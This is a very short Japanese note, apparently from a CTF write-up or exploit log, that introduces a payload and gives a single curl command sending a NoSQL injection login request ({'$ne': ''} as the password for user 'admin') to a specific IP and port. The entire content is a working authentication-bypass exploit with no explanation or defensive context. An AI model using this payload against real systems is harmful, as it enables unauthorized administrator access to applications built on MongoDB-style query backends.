ペイロードは以下。

```bash
curl -X POST http://34.170.146.252:19790/ \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$ne": ""}}'
```